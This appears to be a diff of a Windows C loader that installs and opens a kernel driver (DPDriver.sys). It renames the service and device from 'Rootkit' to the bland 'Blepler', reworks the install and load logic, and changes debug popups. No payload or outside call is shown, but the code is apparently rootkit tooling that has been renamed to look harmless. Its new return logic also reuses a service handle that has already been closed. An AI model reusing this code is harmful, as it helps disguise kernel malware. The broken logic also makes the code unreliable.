@@ -2,10 +2,10 @@
 
 #define ARG L"monitorproc"
 
-#define SERVICE "Rootkit"
-#define DNAME   "Dppr"
-#define DEVICE "\\\\.\\Rootkit"
-#define DRIVER "c:\\Windows\System32\drivers\DPDriver.sys"
+#define SERVICE "Blepler"
+//#define DNAME   "AAAtest"
+#define DEVICE "\\\\.\\Blepler"
+#define DRIVER "C:\\Windows\\System32\\drivers\\DPDriver.sys"
 
 HANDLE install_driver();
 BOOL load_driver(SC_HANDLE svcHandle);
@@ -121,7 +121,7 @@ BOOL load_driver(SC_HANDLE svcHandle) {
 		// Check if error was due to the driver already running
 		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
 
-			popup("Driver running", "Hm");
+			popup("Driver running", "GRRR");
 			return TRUE;
 
 		}
@@ -131,7 +131,6 @@ BOOL load_driver(SC_HANDLE svcHandle) {
 		}
 	}
 
-	printf("[+] Driver loaded.\n");
 	return TRUE;
 }
 
@@ -144,11 +143,10 @@ HANDLE install_driver() {
 
 	HANDLE device = NULL;
 
-	
 	/* Installing service (if it doesn't exist yet..) */
 	if (!hService && GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
 
-		popup("I am inside the if (line 134)", "Woow");
+		popup("I am inside the if (line 151)", "Woow");
 
 		hService = CreateService
 		(
@@ -164,43 +162,44 @@ HANDLE install_driver() {
 
 		);
 
+		if (!hService) {
+			popup("Could not create service", "Oop");
+			printError();
+		}
+		else {
+			popup("Hi", "Else statenebt");
+		}
+
+		
+
+	}
+	else if (!hService) {
+
 		if (load_driver(hService)) {
 
-			popup("loaded driver", "After it didn't even exist");
+			popup("loaded driver", "YEAH!");
 
 		}
-
-	}
-	else {
-		
-		device = CreateFile
-		(
-			TEXT(DEVICE),
-			GENERIC_READ | GENERIC_WRITE,
-			0,
-			NULL,
-			OPEN_EXISTING,
-			FILE_ATTRIBUTE_NORMAL,
-			NULL
-		);
-
-		if (device == INVALID_HANDLE_VALUE) {
-			popup("Invalid handle", "wawawa");
-		}
-
-		if (device == INVALID_HANDLE_VALUE && !load_driver(hService)) {
-			popup("Invalid handle?!", "Interesting");
-			device = NULL;
-		}
-
-		popup("Hello from", "The other side!");
 	}
 	
+		
+	device = CreateFile
+	(
+		TEXT(DEVICE),
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+
+	popup("Hello from", "The other side!");
 
 	CloseServiceHandle(hService);
 	CloseServiceHandle(hSCManager);
 
-	return device != INVALID_HANDLE_VALUE ? device : NULL;
+	return device == INVALID_HANDLE_VALUE && !load_driver(hService) ? NULL : device;
 }
 
 
